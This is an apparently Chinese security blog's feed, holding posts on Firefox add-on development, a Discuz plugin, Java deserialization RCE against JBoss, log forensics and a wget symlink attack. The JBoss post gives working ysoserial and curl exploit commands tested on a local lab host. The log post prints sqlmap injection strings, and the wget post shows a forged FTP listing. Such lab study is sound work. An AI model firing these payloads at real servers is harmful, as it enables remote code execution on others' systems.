https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/tabs</span></span><br><span class="line"><span class="keyword">var</span> tabs = <span class="built_in">require</span>(<span class="string">"sdk/tabs"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//命令行输出api,参考 https://developer.mozilla.org/en-US/Add-ons/SDK/Tools/console</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Hello Firefox -_-'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//浏览器右上方按钮,其他位置的控件参考 高级API中的 ui </span></span><br><span class="line"><span class="keyword">var</span> button = buttons.ActionButton(&#123;</span><br><span class="line">  id: <span class="string">"mozilla-link"</span>,</span><br><span class="line">  label: <span class="string">"Visit Mozilla"</span>,</span><br><span class="line">  icon: &#123;</span><br><span class="line">    <span class="string">"16"</span>: <span class="string">"./icon-16.png"</span>,</span><br><span class="line">    <span class="string">"32"</span>: <span class="string">"./icon-32.png"</span>,</span><br><span class="line">    <span class="string">"64"</span>: <span class="string">"./icon-64.png"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  onClick: handleClick   <span class="comment">//点击事件</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleClick</span>(<span class="params">state</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">console</span>.log(state); </span><br><span class="line">   <span class="comment">//tab打开页面,更多事件参考高级api中的tab </span></span><br><span class="line">   tabs.open(<span class="string">"http://www.yaseng.org/"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>运行如下<br><a href="/uploads/2015/11/4.jpg"><img src="/uploads/2015/11/4-300x167.jpg" alt="" title="4"></a><br>命令行输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  bin git:(master) ✗ cd   ya_addon</span><br><span class="line">➜  ya_addon git:(master) ✗ ls</span><br><span class="line">README.md    data         index.js     package.json test</span><br><span class="line">➜  ya_addon git:(master) ✗ ../jpm run</span><br><span class="line">JPM [info] Starting jpm run on ya_addon</span><br><span class="line">Creating XPI</span><br><span class="line">JPM [info] XPI created at /var/folders/_c/p_7pjb_d4snbb2k72cgrqjc80000gn/T/@yaaddon-0.0.0.xpi (38ms)</span><br><span class="line">Created XPI at /var/folders/_c/p_7pjb_d4snbb2k72cgrqjc80000gn/T/@yaaddon-0.0.0.xpi</span><br><span class="line">JPM [info] Creating a new profile</span><br><span class="line">console.log: yaaddon: Hello Firefox -_-</span><br><span class="line">console.log: yaaddon: &#123;&quot;disabled&quot;:false,&quot;label&quot;:&quot;Visit Mozilla&quot;,&quot;icon&quot;:&#123;&quot;16&quot;:&quot;./icon-16.png&quot;,&quot;32&quot;:&quot;./icon-32.png&quot;,&quot;64&quot;:&quot;./icon-64.png&quot;&#125;,&quot;id&quot;:&quot;mozilla-link&quot;&#125;</span><br><span class="line">console.log: yaaddon: &#123;&quot;disabled&quot;:false,&quot;label&quot;:&quot;Visit Mozilla&quot;,&quot;icon&quot;:&#123;&quot;16&quot;:&quot;./icon-16.png&quot;,&quot;32&quot;:&quot;./icon-32.png&quot;,&quot;64&quot;:&quot;./icon-64.png&quot;&#125;,&quot;id&quot;:&quot;mozilla-link&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>任何开发都离开不了调试，firefox 扩展静态可以<br>使用console.log 来输出信息，动态调试使用自带的调试器。<br>工具-&gt;web开发者-&gt;调试器<br>点开设置页面，选上动浏览器chrome 部分和附加组件的调试<br>工具箱和启动远程调试。如下图<br><a href="/uploads/2015/11/5.jpg"><img src="/uploads/2015/11/5-300x155.jpg" alt="" title="5"></a></p>
+<p>jpm run 运行<br>在附件组件当前的插件上面点击调试,会弹出一个调试界面,此时可以断点单步调试,具体如下图 。<br><a href="/uploads/2015/11/6.jpg"><img src="/uploads/2015/11/6-300x200.jpg" alt="" title="6"></a></p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>1:官方文档     <a href="https://developer.mozilla.org/en-US/Add-ons" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons</a><br>2:jpm             <a href="https://github.com/mozilla-jetpack/jpm.git" target="_blank" rel="external">https://github.com/mozilla-jetpack/jpm.git</a><br>3:高级api       <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs</a><br>4:低级api       <a href="https://developer.mozilla.org/en-US/Add-ons/SDK/Low-Level_APIs" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/SDK/Low-Level_APIs</a><br>5:调试            <a href="https://developer.mozilla.org/en-US/Add-ons/Add-on_Debugger" target="_blank" rel="external">https://developer.mozilla.org/en-US/Add-ons/Add-on_Debugger</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;火狐作为知名开源的浏览器，虽然用户量大，开发者众多，然而国内现有的有关扩展组件开发可供利用的资料却乏善&lt;br&gt;可陈，以前迫于时间关系，在开发火狐扩展的项目中，大都实行拿来主义，借鉴现有的插件，其中眉目关系不求甚解，近&lt;br&gt;来在开发某个插件的过程中，遇到了多环境不兼容的问题，彻夜调试不得其解，终痛下决心，颇费心力以研究有关火狐开&lt;br&gt;发的相关思路和开发模式，特把相关心得以表如下，抓耳挠腮之作，权为投石问路，望诸君不吝赐教。&lt;br&gt;&amp;nbsp;&amp;nbsp;过往对于火狐开发的认知几许迷惶，火狐官方对于开发文档和开发环境IDE的规范化相当混乱，颇有朝令夕改之态势，&lt;br&gt;诸如开发工具从最初的手工打包到Web 的ide到Python 的cfx ，转而又到现在最新的基于node.js的jpm(firefox&amp;gt;= 38)，此&lt;br&gt;点当为大多数火狐开发爱好者的掣肘,鉴于此，本文以最新的火狐jpm开发工具为例，详述了相关环境以及项目实现的流程&lt;br&gt;和思路。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Firefox" scheme="yaseng.org/categories/Firefox/"/>
+    
+      <category term="西部大开发" scheme="yaseng.org/categories/Firefox/%E8%A5%BF%E9%83%A8%E5%A4%A7%E5%BC%80%E5%8F%91/"/>
+    
+    
+      <category term="Firefox" scheme="yaseng.org/tags/Firefox/"/>
+    
+      <category term="firefox 扩展" scheme="yaseng.org/tags/firefox-%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="firefox 扩展开发笔记" scheme="yaseng.org/tags/firefox-%E6%89%A9%E5%B1%95%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="firefox 插件" scheme="yaseng.org/tags/firefox-%E6%8F%92%E4%BB%B6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>[原创作品] Discuz 左岸在线客服中心 1.0 </title>
+    <link href="yaseng.org/discuz-uauc-onserv-plugin-1-0.html"/>
+    <id>yaseng.org/discuz-uauc-onserv-plugin-1-0.html</id>
+    <published>2015-11-10T01:41:21.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="插件介绍"><a href="#插件介绍" class="headerlink" title="插件介绍"></a>插件介绍</h3><p>左岸在线客服中心是一款简单方便的discuz 左侧弹出在线客服插件,可以diy出<br>各种弹出的炫酷特效、弹出内容、样式、以及透明度等。<br>插件地址  <a href="http://addon.discuz.com/?@uauc_onserv.plugin" title="http://addon.discuz.com/?@uauc_onserv.plugin" target="_blank" rel="external">http://addon.discuz.com/?@uauc_onserv.plugin</a><br><a id="more"></a></p>
+<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><p>安装之后在插件中心配置内容即可,其他选项默认也可以自行修改。</p>
+<h3 id="功能特色"><a href="#功能特色" class="headerlink" title="功能特色"></a>功能特色</h3><p>1:支持自定义高度,透明度。<br>2:支持各种炫酷的弹出缩入动作特效:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">linear 平滑</span><br><span class="line">easeInOutBack 三次方特效(推荐)</span><br><span class="line">easeInElastic 正弦曲线特效</span><br><span class="line">easeOutQuint 五次方特效</span><br><span class="line">easeInOutCirc 圆形曲线特效</span><br><span class="line">easeInOutExpo 指数曲线特效</span><br></pre></td></tr></table></figure></p>
+<p>3:完全自定义弹出样式和内容。</p>
+<h3 id="示范"><a href="#示范" class="headerlink" title="示范"></a>示范</h3><p>地址<br><a href="http://101.200.209.68/dzgbkx32/forum.php" title="http://101.200.209.68/dzgbkx32/forum.php" target="_blank" rel="external">http://101.200.209.68/dzgbkx32/forum.php</a></p>
+<p>截图</p>
+<p><a href="/uploads/2015/11/uauc_onserv_2.jpg"><img src="/uploads/2015/11/uauc_onserv_2-300x258.jpg" alt="" title="uauc_onserv_2"></a></p>
+<p><a href="/uploads/2015/11/uauc_onserv_3.jpg"><img src="/uploads/2015/11/uauc_onserv_3-300x233.jpg" alt="" title="uauc_onserv_3"></a></p>
+<h3 id="UaUc技术支持"><a href="#UaUc技术支持" class="headerlink" title="UaUc技术支持"></a>UaUc技术支持</h3><p>UaUcNet专业服务于广大discuz站长，提供插件私人定制，二次开发，模板定制，论坛疑难问题解答，搬家升级等服务！以专业成熟的技术水平，认真负责的工作态度，为您的论坛运营提供最贴心的技术服务！ 详情请联系UaUCNet团队客服 QQ：189333720  。<br><a href="tencent://message/?uin=189333720&amp;Site=http://www.uauc.net&amp;Menu=yes" target="_blank" rel="external"><img src="http://wpa.qq.com/pa?p=2:189333720:42" alt="QQ" title="QQ"></a> </p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;插件介绍&quot;&gt;&lt;a href=&quot;#插件介绍&quot; class=&quot;headerlink&quot; title=&quot;插件介绍&quot;&gt;&lt;/a&gt;插件介绍&lt;/h3&gt;&lt;p&gt;左岸在线客服中心是一款简单方便的discuz 左侧弹出在线客服插件,可以diy出&lt;br&gt;各种弹出的炫酷特效、弹出内容、样式、以及透明度等。&lt;br&gt;插件地址  &lt;a href=&quot;http://addon.discuz.com/?@uauc_onserv.plugin&quot; title=&quot;http://addon.discuz.com/?@uauc_onserv.plugin&quot;&gt;http://addon.discuz.com/?@uauc_onserv.plugin&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="php" scheme="yaseng.org/categories/php/"/>
+    
+      <category term="西部大开发" scheme="yaseng.org/categories/php/%E8%A5%BF%E9%83%A8%E5%A4%A7%E5%BC%80%E5%8F%91/"/>
+    
+    
+      <category term="原创作品" scheme="yaseng.org/tags/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
+    
+      <category term="discuz插件" scheme="yaseng.org/tags/discuz%E6%8F%92%E4%BB%B6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>关于java unserialize rce 一些细节和jboss rce 实践</title>
+    <link href="yaseng.org/java-unserialize-rce-and-jboss-rce.html"/>
+    <id>yaseng.org/java-unserialize-rce-and-jboss-rce.html</id>
+    <published>2015-11-10T00:03:54.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>   大概和php的差不多反序列化时对象注入可以造成代码执行,例如 commons-collections-3.2.1.jar 包就存在这个漏洞,所以只要使用了这个lib的都有可能rce,例如jboss,jenkins,weblogic 等。</p>
+<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><pre><code>有人写了一个执行命令的payload 生成器,java反射调用Runtime.getRunTime.exec 执行命令,应该也可以改成写文件之类的(未验证)。
+</code></pre> <a id="more"></a>
+<h3 id="jboss-利用实践"><a href="#jboss-利用实践" class="headerlink" title="jboss 利用实践"></a>jboss 利用实践</h3><p><strong>环境</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum install java-1.7.0-openjdk-devel -y</span><br><span class="line">wget -O jboss-4.2.3.zip http://sourceforge.net/projects/jboss/files/JBoss/JBoss-4.2.3.GA/jboss-4.2.3.GA-jdk6.zip/download</span><br><span class="line">unzip jboss-4.2.3.zip</span><br><span class="line">mv jboss-4.2.3.GA /usr/local/share/jboss</span><br><span class="line">adduser appserver</span><br><span class="line">chown -R appserver /usr/local/share/jboss</span><br><span class="line">su -l appserver</span><br><span class="line">cd /usr/local/share/jboss/bin</span><br><span class="line"> ./run.sh -b 0.0.0.0</span><br></pre></td></tr></table></figure></p>
+<p><strong>exploit</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/frohoff/ysoserial/releases/download/v0.0.2/ysoserial-0.0.2-all.jar</span><br><span class="line">java -jar  ysoserial-0.0.2-all.jar   CommonsCollections1  &apos;echo 1 &gt; /tmp/pwned&apos;  &gt;  payload</span><br><span class="line">java -jar ysoserial-0.0.2-all.jar CommonsCollections1 &apos;touch /tmp/pwned&apos; &gt; /tmp/payload</span><br><span class="line">curl --header &apos;Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue&apos; --data-binary &apos;@/tmp/payload&apos; http://127.0.0.1:8080/invoker/JMXInvokerServlet</span><br></pre></td></tr></table></figure></p>
+<p><strong>测试</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@uauc ~]# rm  -rf   /tmp/pwned </span><br><span class="line">[root@uauc ~]# ls -lh   /tmp/pwned</span><br><span class="line">ls: cannot access /tmp/pwned: No such file or directory</span><br><span class="line">[root@uauc ~]# curl --header &apos;Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue&apos; --data-binary &apos;@/tmp/payload&apos; http://127.0.0.1:8080/invoker/JMXInvokerServlet  &gt;  1.log</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  5335    0  3927  100  1408  39474  14153 --:--:-- --:--:-- --:--:-- 42225</span><br><span class="line">[root@uauc ~]# ls -lh   /tmp/pwned</span><br><span class="line">-rw-rw-r-- 1 appserver appserver 0 Nov 10 15:27 /tmp/pwned</span><br></pre></td></tr></table></figure></p>
+<p>成功-_-<br><strong>图片</strong><br><a href="/uploads/2015/11/QQ图片20151110153639.png"><img src="/uploads/2015/11/QQ图片20151110153639-300x64.png" alt="" title="QQ图片20151110153639"></a></p>
+<h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><pre><code>具体漏洞原理利用以及受影响应用还待研究,权为抛砖引玉,欢迎讨论。
+</code></pre><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#thevulnerability" target="_blank" rel="external">http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#thevulnerability</a><br><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="external">https://github.com/foxglovesec/JavaUnserializeExploits</a><br><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">https://github.com/frohoff/ysoserial</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;   大概和php的差不多反序列化时对象注入可以造成代码执行,例如 commons-collections-3.2.1.jar 包就存在这个漏洞,所以只要使用了这个lib的都有可能rce,例如jboss,jenkins,weblogic 等。&lt;/p&gt;
+&lt;h3 id=&quot;利用方法&quot;&gt;&lt;a href=&quot;#利用方法&quot; class=&quot;headerlink&quot; title=&quot;利用方法&quot;&gt;&lt;/a&gt;利用方法&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;有人写了一个执行命令的payload 生成器,java反射调用Runtime.getRunTime.exec 执行命令,应该也可以改成写文件之类的(未验证)。
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="Hack" scheme="yaseng.org/categories/Hack/"/>
+    
+      <category term="技术文章" scheme="yaseng.org/categories/Hack/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
+    
+    
+      <category term="java 漏洞" scheme="yaseng.org/tags/java-%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="jboss 漏洞" scheme="yaseng.org/tags/jboss-%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux安全运维日志排查几个tips</title>
+    <link href="yaseng.org/audit-log.html"/>
+    <id>yaseng.org/audit-log.html</id>
+    <published>2015-11-08T22:08:16.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记录一些排查常见日志的命令,方法wiki,欢迎补充 。<br><a href="https://github.com/yaseng/pentest/blob/master/note/audit-log.md" title="https://github.com/yaseng/pentest/blob/master/note/audit-log.md" target="_blank" rel="external">https://github.com/yaseng/pentest/blob/master/note/audit-log.md</a><br><a id="more"></a></p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>1. 查找关键词并统计行数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 2015_7_25_test_access.log | grep &quot;sqlmap&quot; | wc -l</span><br></pre></td></tr></table></figure></p>
+<p>2. 删除含有匹配字符的行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &apos;/Indy Library/d&apos; 2015_7_25_test_access.log</span><br></pre></td></tr></table></figure></p>
+<p>3. 查找所有日志中的关键词<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name &quot;*.log&quot; |xargs grep &quot;sqlmap&quot; |wc -l</span><br></pre></td></tr></table></figure></p>
+<p>4. 获取特殊行(如id)并且排序统计<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat cszl988.log | awk &apos;&#123;print $1&#125;&apos; | awk -F : &apos;&#123;print $2&#125;&apos; | sort -u | wc -l</span><br></pre></td></tr></table></figure></p>
+<p>5. 正则匹配内容(如提取ip)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E -o &quot;([0-9]&#123;1,3&#125;[\.])&#123;3&#125;[0-9]&#123;1,3&#125;&quot;</span><br></pre></td></tr></table></figure></p>
+<p>6. 去重并统计数量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail 3.log | awk &apos;&#123;print $7&#125;&apos; | sort | uniq -c</span><br></pre></td></tr></table></figure></p>
+<p>7. 批量提取(全流量中)数据包并且过滤数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash </span><br><span class="line"> for file in ` ls $1 ` </span><br><span class="line"> do</span><br><span class="line"> parse_pcap -vvb $file | grep -v &quot;Host:&quot; | grep -v &quot;Cookie:&quot; | grep -v &quot;User-Agent:&quot; | grep -v &quot;Accept:&quot; | grep -v &quot;Accept:&quot; | grep -v &quot;Accept-Language:&quot; | grep -v &quot;Accept-Encoding:&quot; | grep -v &quot;Connection:&quot; | grep -v &quot;Content-Type:&quot; | grep -v &quot;Content-Length&quot; | grep -v &quot;Server&quot; </span><br><span class="line"> done</span><br></pre></td></tr></table></figure></p>
+<p>8. url 解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat luban.log | grep sqlmap | awk &apos;&#123;print $7&#125;&apos; | xargs python -c &apos;import sys, urllib; print urllib.unquote(sys.argv[1])&apos;</span><br></pre></td></tr></table></figure></p>
+<p>9. 欢迎补充….</p>
+<h3 id="示范"><a href="#示范" class="headerlink" title="示范"></a>示范</h3><p>xxxx站注入日志排查</p>
+<ul>
+<li><p>查看所有sqlmap注入记录条数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@pentest temp]# cat luban.log | grep sqlmap | wc -l</span><br><span class="line">1241</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>预览几条url </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cat luban.log | grep sqlmap | awk &apos;&#123;print $7&#125;&apos; | more</span><br><span class="line">/news.php?id=771%28.%28%22%29.%27%29%29%27&amp;amp;fid=168</span><br><span class="line">/news.php?id=771%27IddP%3C%27%22%3EvCBw&amp;amp;fid=168</span><br><span class="line">/news.php?id=771%29%20AND%201148%3D8887%20AND%20%288975%3D8975&amp;amp;fid=168</span><br><span class="line">/news.php?id=771%29%20AND%208790%3D8790%20AND%20%287928%3D7928&amp;amp;fid=168</span><br><span class="line">/news.php?id=771%20AND%204294%3D9647&amp;amp;fid=168</span><br><span class="line">/news.php?id=771%20AND%208790%3D8790&amp;amp;fid=168</span><br><span class="line">/news.php?id=771%27%29%20AND%205983%3D7073%20AND%20%28%27UwRr%27%3D%27UwRr&amp;amp;fid=168</span><br><span class="line">/news.php?id=771%27%29%20AND%208790%3D8790%20AND%20%28%27hwaT%27%3D%27hwaT&amp;amp;fid=168</span><br><span class="line">/news.php?id=771%27%20AND%206578%3D7565%20AND%20%27EoTZ%27%3D%27EoTZ&amp;amp;fid=168</span><br><span class="line">/news.php?id=771%27%20AND%208790%3D8790%20AND%20%27lBdL%27%3D%27lBdL&amp;amp;fid=168</span><br><span class="line">/news.php?id=771%25%27%20AND%205177%3D1107%20AND%20%27%25%27%3D%27&amp;amp;fid=168</span><br><span class="line">/news.php?id=771%25%27%20AND%208790%3D8790%20AND%20%27%25%27%3D%27&amp;amp;fid=168</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>方便查看 urldecode </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat luban.log | grep sqlmap | awk &apos;&#123;print $7&#125;&apos; | xargs python -c &apos;import sys, urllib; print urllib.unquote(sys.argv[1])&apos;</span><br><span class="line">/news.php?id=771&amp;amp;fid=168</span><br><span class="line">/news.php?id=771&amp;amp;fid=168 AND ASCII(SUBSTRING((SELECT DISTINCT(COALESCE(CAST(schemaname AS CHARACTER(10000)),(CHR(32)))) FROM pg_tables OFFSET 1 LIMIT 1)::text FROM 3 FOR 1))&gt;</span><br><span class="line">97</span><br><span class="line">/news.php?id=771&amp;amp;fid=168 UNION ALL SELECT NULL,(CHR(113)||CHR(122)||CHR(106)||CHR(120)||CHR(113))||(CHR(103)||CHR(75)||CHR(78)||CHR(87)||CHR(76)||CHR(74)||CHR(110)||CHR(1</span><br><span class="line">15)||CHR(100)||CHR(85))||(CHR(113)||CHR(122)||CHR(120)||CHR(113)||CHR(113)),NULL,NULL,NULL,NULL,NULL,NULL,NULL UNION ALL SELECT NULL,(CHR(113)||CHR(122)||CHR(106)||CHR(120)||CHR(113))||(CHR(113)||CHR(71)||C</span><br><span class="line">HR(74)||CHR(82)||CHR(101)||CHR(120)||CHR(69)||CHR(112)||CHR(117)||CHR(79))||(CHR(113)||CHR(122)||CHR(120)||CHR(113)||CHR(113)),NULL,NULL,NULL,NULL,NULL,NULL,NULL--</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;记录一些排查常见日志的命令,方法wiki,欢迎补充 。&lt;br&gt;&lt;a href=&quot;https://github.com/yaseng/pentest/blob/master/note/audit-log.md&quot; title=&quot;https://github.com/yaseng/pentest/blob/master/note/audit-log.md&quot;&gt;https://github.com/yaseng/pentest/blob/master/note/audit-log.md&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Hack" scheme="yaseng.org/categories/Hack/"/>
+    
+      <category term="技术文章" scheme="yaseng.org/categories/Hack/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
+    
+    
+      <category term="日志" scheme="yaseng.org/tags/%E6%97%A5%E5%BF%97/"/>
+    
+      <category term="运维" scheme="yaseng.org/tags/%E8%BF%90%E7%BB%B4/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux symbolic link  attack tutorial</title>
+    <link href="yaseng.org/linux-symbolic-link-attack-tutorial.html"/>
+    <id>yaseng.org/linux-symbolic-link-attack-tutorial.html</id>
+    <published>2015-01-23T01:54:28.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0×00-前言"><a href="#0×00-前言" class="headerlink" title="0×00  前言"></a>0×00  前言</h3><p>Linux作为应用最广泛的开源系统，其中独特的文件系统可以算是支撑Linux强大功能的核心组件之一，而<br>在文件系统中，符号链接(symbolic link )形如”月光宝盒”般可以穿梭时空，自由穿越森严的路径限制，此一<br>特性，使其地位在整个Linux系统中占有重要一席，本文将通过实际分析与研究，深入探讨因对符号链接处理<br>不当，可能造成的各类安全问题，以引发对此类问题的重视。<br><a id="more"></a></p>
+<h3 id="0×01-客户端"><a href="#0×01-客户端" class="headerlink" title="0×01  客户端"></a>0×01  客户端</h3><p> 客户端递归处理文件时,通过符号链接穿越可造成任意文件写入,代码执行。<br>案例:<br>1:Wget ftp  symbolic link  attack  (CVE-2014-4877)<br>wget  递归下载ftp站点时,如 wget -m ftp://127.0.0.1,在服务端伪造如下数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 33 Oct 11 2013 fakedir -&gt; /tmp</span><br><span class="line">drwxrwxr-x 15 root root 4096 Oct 11 2013 fakedir</span><br></pre></td></tr></table></figure></p>
+<p>会在本地建立一个名称为fakedir的symbolic link ,指向/tmp 目录,当wget 发送<br>cwd 指令递归进入fakedir 在发送 LIST 指令。此时可以伪造一个恶意文件或者<br>目录比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwx------ 1 root root 21 Aug 29 2013 pwned</span><br></pre></td></tr></table></figure></p>
+<p> RETR 指令下载pwned 文件时,返回文件内容(二进制或者文本)。即可欺骗wget<br>客户端任意目录写入。</p>
+<p>具体利用脚本:<br><a href="https://github.com/yaseng/pentest/blob/master/exploit/wget-symlink_attack_exploit.py" title="https://github.com/yaseng/pentest/blob/master/exploit/wget-symlink_attack_exploit.py" target="_blank" rel="external">https://github.com/yaseng/pentest/blob/master/exploit/wget-symlink_attack_exploit.py</a></p>
+<p>漏洞演示:<br>Server(attacker)  wget-symlink_attack_exploit.py<br>Client(victim)    wget -m ftp://127.0.0.1</p>
+<p><a href="/uploads/2014/11/wget-1.jpg"><img src="/uploads/2014/11/wget-1-300x293.jpg" alt="" title="wget-1"></a></p>
